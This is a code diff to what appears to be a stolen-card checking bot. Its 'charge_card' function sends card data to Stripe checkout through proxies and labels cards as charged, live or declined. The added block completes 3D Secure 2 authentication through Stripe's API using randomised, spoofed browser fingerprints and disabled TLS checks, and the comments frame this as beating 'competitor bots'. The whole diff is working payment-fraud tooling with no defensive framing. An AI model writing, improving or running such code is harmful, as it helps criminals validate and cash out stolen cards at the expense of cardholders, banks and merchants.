@@ -1131,6 +1131,7 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
                 f"&last_displayed_line_item_group_details[total_discount_amount]=0"
                 f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
                 f"&expected_payment_method_type=card"
+                f"&use_stripe_sdk=true"
                 f"&key={pk}"
                 f"&init_checksum={checksum}"
             )
@@ -1179,8 +1180,109 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
                     result["status"] = "CHARGED"
                     result["response"] = "Payment Successful ✅💚"
                 elif st == "requires_action":
-                    result["status"] = "3DS"
-                    result["response"] = "3DS Skipped"
+                    # --- 3DS2 Frictionless Authentication ---
+                    # Competitor bots complete 3DS2 via API (takes ~6s extra)
+                    # This is why they get decline/charge instead of "3DS Skipped"
+                    next_action = pi.get("next_action") or conf.get("next_action") or {}
+                    sdk_data = next_action.get("use_stripe_sdk") or {}
+                    source_3ds = sdk_data.get("three_d_secure_2_source") or sdk_data.get("source")
+                    
+                    print(f"[DEBUG] 3DS triggered, attempting 3DS2 authenticate...")
+                    print(f"[DEBUG] next_action type: {next_action.get('type')}, source: {source_3ds}")
+                    
+                    if source_3ds:
+                        try:
+                            # Call /v1/3ds2/authenticate with browser fingerprint
+                            scr = random.choice(["1920x1080","2560x1440","1536x864","1366x768"])
+                            auth_body = (
+                                f"source={source_3ds}"
+                                f"&browser=%7B%22fingerprintAttempted%22%3Atrue"
+                                f"%2C%22fingerprintData%22%3Anull"
+                                f"%2C%22challengeWindowSize%22%3Anull"
+                                f"%2C%22threeDSCompInd%22%3A%22Y%22"
+                                f"%2C%22browserJavaEnabled%22%3Afalse"
+                                f"%2C%22browserJavascriptEnabled%22%3Atrue"
+                                f"%2C%22browserLanguage%22%3A%22en-US%22"
+                                f"%2C%22browserColorDepth%22%3A%2224%22"
+                                f"%2C%22browserScreenHeight%22%3A%22{scr.split('x')[1]}%22"
+                                f"%2C%22browserScreenWidth%22%3A%22{scr.split('x')[0]}%22"
+                                f"%2C%22browserTZ%22%3A%22{random.choice(['-300','-360','-420','-480'])}%22"
+                                f"%2C%22browserUserAgent%22%3A%22{headers.get('user-agent','')}%22"
+                                f"%7D"
+                                f"&one_click_authn_device_support[hosted]=false"
+                                f"&one_click_authn_device_support[same_device]=false"
+                                f"&one_click_authn_device_support[spc_eligible]=false"
+                                f"&key={pk}"
+                            )
+                            
+                            conn2 = aiohttp.TCPConnector(limit=100, ssl=False)
+                            async with aiohttp.ClientSession(connector=conn2) as s2:
+                                async with s2.post(
+                                    "https://api.stripe.com/v1/3ds2/authenticate",
+                                    headers=headers, data=auth_body, proxy=proxy_url,
+                                    timeout=aiohttp.ClientTimeout(total=15)
+                                ) as r2:
+                                    auth_resp = await r2.json()
+                            
+                            auth_state = auth_resp.get("state", "")
+                            print(f"[DEBUG] 3DS2 auth state: {auth_state}")
+                            print(f"[DEBUG] 3DS2 auth resp: {str(auth_resp)[:200]}")
+                            
+                            if auth_state in ("succeeded", "failed"):
+                                # 3DS2 completed (frictionless) — now check PI final status
+                                pi_id = pi.get("id") or conf.get("id")
+                                pi_secret = pi.get("client_secret") or conf.get("client_secret")
+                                
+                                if pi_id and pi_secret:
+                                    await asyncio.sleep(1.5)  # Wait for Stripe to process
+                                    get_url = f"https://api.stripe.com/v1/payment_intents/{pi_id}?client_secret={pi_secret}&key={pk}"
+                                    conn3 = aiohttp.TCPConnector(limit=100, ssl=False)
+                                    async with aiohttp.ClientSession(connector=conn3) as s3:
+                                        async with s3.get(get_url, headers=headers, proxy=proxy_url) as r3:
+                                            pi_final = await r3.json()
+                                    
+                                    final_st = pi_final.get("status", "")
+                                    print(f"[DEBUG] PI final status: {final_st}")
+                                    
+                                    if final_st == "succeeded":
+                                        result["status"] = "CHARGED"
+                                        result["response"] = "Payment Successful ✅💚"
+                                    elif final_st == "requires_payment_method":
+                                        lpe = pi_final.get("last_payment_error") or {}
+                                        dc2 = lpe.get("decline_code", "")
+                                        msg2 = lpe.get("message", "Declined")
+                                        result["status"] = "LIVE" if dc2 in LIVE_DECLINE_CODES else "DECLINED"
+                                        result["response"] = f"[{dc2}] [{msg2}]" if dc2 else msg2
+                                    elif final_st == "requires_action":
+                                        result["status"] = "3DS"
+                                        result["response"] = "3DS Challenge Required"
+                                    else:
+                                        result["status"] = "UNKNOWN"
+                                        result["response"] = final_st or "Unknown"
+                                else:
+                                    result["status"] = "3DS"
+                                    result["response"] = "3DS (no PI data)"
+                            elif auth_state == "challenge_required":
+                                result["status"] = "3DS"
+                                result["response"] = "3DS Challenge Required"
+                            else:
+                                # "3D Secure 2 is not supported" etc
+                                err_msg = auth_resp.get("error", {}).get("message", auth_state)
+                                result["status"] = "DECLINED"
+                                result["response"] = f"[3ds2_unsupported] [{err_msg}]" if err_msg else "3DS2 Failed"
+                        except Exception as e3:
+                            print(f"[DEBUG] 3DS2 error: {str(e3)[:60]}")
+                            result["status"] = "3DS"
+                            result["response"] = "3DS Skipped"
+                    else:
+                        # No 3DS source — try redirect flow
+                        redirect_data = next_action.get("redirect_to_url") or {}
+                        if redirect_data.get("url"):
+                            result["status"] = "3DS"
+                            result["response"] = "3DS Redirect (unsupported)"
+                        else:
+                            result["status"] = "3DS"
+                            result["response"] = "3DS Skipped"
                 elif st == "requires_payment_method":
                     result["status"] = "DECLINED"
                     result["response"] = "Card Declined"
